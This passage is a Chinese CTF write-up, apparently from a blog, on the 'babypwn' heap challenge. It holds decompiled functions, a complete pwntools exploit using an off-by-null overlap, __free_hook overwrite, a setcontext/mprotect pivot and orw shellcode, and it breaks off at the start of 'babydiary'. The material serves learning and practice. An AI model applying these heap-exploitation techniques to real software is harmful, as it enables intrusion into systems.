&#125;</span><br><span class="line">  *((_QWORD *)&amp;unk_202060 + <span class="number">2</span> * i) = <span class="built_in">malloc</span>(size);<span class="comment">// 申请大小</span></span><br><span class="line">  qword_202068[<span class="number">2</span> * i] = size;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;done&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>edit函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_EE3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">  v1 = (<span class="keyword">int</span>)sub_BEF();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0x10</span> || !*((_QWORD *)&amp;unk_202060 + <span class="number">2</span> * v1) || !qword_202068[<span class="number">2</span> * v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *((<span class="keyword">void</span> **)&amp;unk_202060 + <span class="number">2</span> * v1), qword_202068[<span class="number">2</span> * v1]);<span class="comment">// 读入时没有截断，可能存在地址泄露</span></span><br><span class="line">  sub_EB1(*((_QWORD *)&amp;unk_202060 + <span class="number">2</span> * v1));<span class="comment">// 这里就是检测函数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>跟进<code>sub_EB1</code>检测函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_EB1</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> __int8)*a1;</span><br><span class="line">    <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 == <span class="number">0x11</span> )<span class="comment">// 遇到0x11的时候，停止并将该字符替换为0</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = (<span class="keyword">unsigned</span> __int64)a1;</span><br><span class="line">      *a1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    ++a1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>show函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_103A</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">  v1 = (<span class="keyword">int</span>)sub_BEF();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0x10</span> || !*((_QWORD *)&amp;unk_202060 + <span class="number">2</span> * v1) || !qword_202068[<span class="number">2</span> * v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_FCC(**((<span class="keyword">unsigned</span> <span class="keyword">int</span> **)&amp;unk_202060 + <span class="number">2</span> * v1));</span><br><span class="line">  sub_FCC(*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(*((_QWORD *)&amp;unk_202060 + <span class="number">2</span> * v1) + <span class="number">4LL</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>跟进<code>sub_FCC</code>函数，输出的时候会对内容进行异或操作：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_FCC</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">2</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">    a1 ^= (<span class="number">32</span> * a1) ^ ((a1 ^ (<span class="number">32</span> * a1)) &gt;&gt; <span class="number">17</span>) ^ (((<span class="number">32</span> * a1) ^ a1 ^ ((a1 ^ (<span class="number">32</span> * a1)) &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">13</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%lx\n&quot;</span>, a1);</span><br></pre></td></tr></table></figure><ul><li>free函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_DD9</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">  v1 = (<span class="keyword">int</span>)sub_BEF();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0x10</span> || !*((_QWORD *)&amp;unk_202060 + <span class="number">2</span> * v1) || !qword_202068[<span class="number">2</span> * v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;unk_202060 + <span class="number">2</span> * v1));</span><br><span class="line">  *((_QWORD *)&amp;unk_202060 + <span class="number">2</span> * v1) = <span class="number">0LL</span>;</span><br><span class="line">  qword_202068[<span class="number">2</span> * v1] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>思路：<ul><li>申请一个0x200大小的堆块，这样它的header为0x211。通过<code>sub_EB1</code>检测函数中的替换功能，可以将堆块header头的<code>\x11</code>替换为<code>\x00</code>，这样就类似于off by null了。</li><li>使用z3解决输出的加密后，泄露libc和heap地址。</li><li>程序使用了沙盒，使用orw读取flag。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, endian = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./babypwn&#x27;</span>, env= &#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;./libseccomp.so.2&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">   cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   init-pwndbg</span></span><br><span class="line"><span class="string">   bpie 0xE69</span></span><br><span class="line"><span class="string">   bpie 0x10CB</span></span><br><span class="line"><span class="string">   bpie 0xD90</span></span><br><span class="line"><span class="string">   bpie 0xF9A</span></span><br><span class="line"><span class="string">   &#x27;&#x27;&#x27;</span></span><br><span class="line">   gdb.attach(sh, cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">target</span>):</span></span><br><span class="line">   a1 = BitVec(<span class="string">&#x27;a1&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">   x = a1</span><br><span class="line">   <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">      x ^= (<span class="number">32</span> * x) ^ LShR((x ^ (<span class="number">32</span> * x)), <span class="number">17</span>) ^ (((<span class="number">32</span> * x) ^ x ^ LShR((x ^ (<span class="number">32</span> * x)), <span class="number">17</span>)) &lt;&lt; <span class="number">13</span>)</span><br><span class="line">   s = Solver()</span><br><span class="line">   s.add(x == target)</span><br><span class="line">   <span class="keyword">assert</span> s.check() == sat</span><br><span class="line">   <span class="keyword">return</span> (s.model()[a1].as_long())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;content&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">   sh.recvline()</span><br><span class="line">   tmp1 = solve(<span class="built_in">int</span>(sh.recvline(keepends = <span class="literal">False</span>), <span class="number">16</span>))</span><br><span class="line">   tmp2 = solve(<span class="built_in">int</span>(sh.recvline(keepends = <span class="literal">False</span>), <span class="number">16</span>))</span><br><span class="line">   <span class="keyword">return</span> (tmp2 &lt;&lt; <span class="number">32</span>) + tmp1</span><br><span class="line"></span><br><span class="line">[add(<span class="number">0x1f0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">[free(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">[add(<span class="number">0x1f0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)]</span><br><span class="line">heapbase = show(<span class="number">0</span>) - <span class="number">0xcb0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heapbase))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1f0</span>)</span><br><span class="line">add(<span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">0x1f0</span>)</span><br><span class="line">[free(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)]</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0xa0</span>) <span class="comment"># 0</span></span><br><span class="line">libc.address = show(<span class="number">0</span>) - <span class="number">0x3ebe90</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x148</span>) <span class="comment"># 1</span></span><br><span class="line">addr = heapbase + <span class="number">0x1ab0</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x148</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x140</span> + p64(<span class="number">0x150</span> + <span class="number">0xa0</span>))</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x1f0</span>) + p64(addr) * <span class="number">2</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x1f0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x211</span>))</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">setcontext = libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line">mprotect = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x120</span>) <span class="comment"># 2</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0xa0</span> + p64(free_hook))</span><br><span class="line">add(<span class="number">0x140</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x140</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">payload = flat(&#123;</span><br><span class="line"><span class="number">0x68</span>: free_hook &amp; ~<span class="number">0xfff</span>,</span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x1000</span>,</span><br><span class="line"><span class="number">0x88</span>: <span class="number">7</span>,</span><br><span class="line"><span class="number">0xa0</span>: free_hook + <span class="number">0x18</span>,</span><br><span class="line"><span class="number">0xa8</span>: mprotect&#125;)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">orw = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 2</span></span><br><span class="line"><span class="string">mov rdi, &#123;flag&#125;</span></span><br><span class="line"><span class="string">mov rsi, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rsi, &#123;bss&#125;</span></span><br><span class="line"><span class="string">mov rdx, 0x300</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, &#123;bss&#125;</span></span><br><span class="line"><span class="string">mov rdx, 0x100</span></span><br><span class="line"><span class="string">syscall </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(flag = free_hook + <span class="number">0x8</span>, bss = free_hook + <span class="number">0x200</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>, p64(setcontext) + <span class="string">&#x27;./flag\x00\x00&#x27;</span> + p64(<span class="number">0</span>) + p64(free_hook + <span class="number">0x20</span>) + orw)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h4><ul><li><p>这里由于<code>free</code>函数向后合并的时候需要检测nextinuse，所以伪造的下下个chunk的inuse位一定要为1，否则会进入<code>unlink</code>函数，并报错<code>corrupted size vs. prev_size</code>。</p><ul><li>这里对应的是第69行的<code>p64(0x211)</code>。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">4302</span>       <span class="comment">/* consolidate forward */</span></span><br><span class="line">  <span class="number">4303</span>       <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">► <span class="number">4304</span> unlink(av, nextchunk, bck, fwd);</span><br><span class="line">  <span class="number">4305</span> size += nextsize;</span><br><span class="line">  <span class="number">4306</span>       &#125; <span class="keyword">else</span></span><br><span class="line">  <span class="number">4307</span> clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></li><li><p>使用unlink函数的时候，如果单纯想要制造堆块重叠，其实只需要将fd和bk设置为伪堆块的头部指针即可 ，这样<code>*(FD -&gt; bk)= p</code>和<code>*(BK -&gt; fd)= p</code>两个条件都满足。</p></li><li><p>在setcontext的过程中，我们要赋给esp的运行地址，且要压入<code>mprotect</code>的函数地址，如果需要在前面加上<code>./flag\x00\x00</code>字符串的话，需要空8个字节，否则字符串就会被<code>mprotect</code>的函数地址覆盖了。</p></li><li><p>setcontext我们已经遇到好几次了，发现不同师傅有不同的写法，实际上还可以这么写：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.rsp = free_hook + <span class="number">0x18</span></span><br><span class="line"><span class="comment"># sig.rbp = sig.rsp</span></span><br><span class="line">sig.rip = mprotect</span><br><span class="line">sig.rdi = free_hook &amp; ~<span class="number">0xfff</span></span><br><span class="line">sig.rsi = <span class="number">0x1000</span></span><br><span class="line">sig.rdx = <span class="number">7</span></span><br><span class="line"><span class="comment"># sig.csgsfs = 0x2b000000000033</span></span><br><span class="line">edit(<span class="number">2</span>, <span class="built_in">str</span>(sig))</span><br></pre></td></tr></table></figure><ul><li>使用gdb进行attach的函数真挺好用的：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">   cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   init-pwndbg</span></span><br><span class="line"><span class="string">   bpie 0xE69</span></span><br><span class="line"><span class="string">   bpie 0x10CB</span></span><br><span class="line"><span class="string">   bpie 0xD90</span></span><br><span class="line"><span class="string">   bpie 0xF9A</span></span><br><span class="line"><span class="string">   &#x27;&#x27;&#x27;</span></span><br><span class="line">   gdb.attach(sh, cmd)</span><br></pre></td></tr></table></figure><h3 id="babydiary"><a href="#babydiary" class="headerlink" title="babydiary"></a>babydiary</h3><ul><li>使用IDA反编译程序：</li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110090236050.png" alt="image-20211007224952773" style="zoom:50%;" /></p><ul><li>发现初始化函数可能存在花指令，将1268地址的数据修改为nop，再进行反编译，就可以看到初始化函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_1269</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">24</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    qword_4060[i] = <span class="number">0LL</span>;</span><br><span class="line">    dword_4140[i] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> alarm(<span class="number">0x78</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>main函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_18BD</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_1416();</span><br><span class="line">    result = sub_13C3();</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">if</span> ( result &gt; <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    <span class="keyword">switch</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        sub_1814();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        sub_169D();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        sub_17A8();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">LABEL_10:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;wrong choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>add函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_169D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">24</span> &amp;&amp; qword_4060[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i &lt;= <span class="number">24</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">    v1 = sub_13C3();</span><br><span class="line">    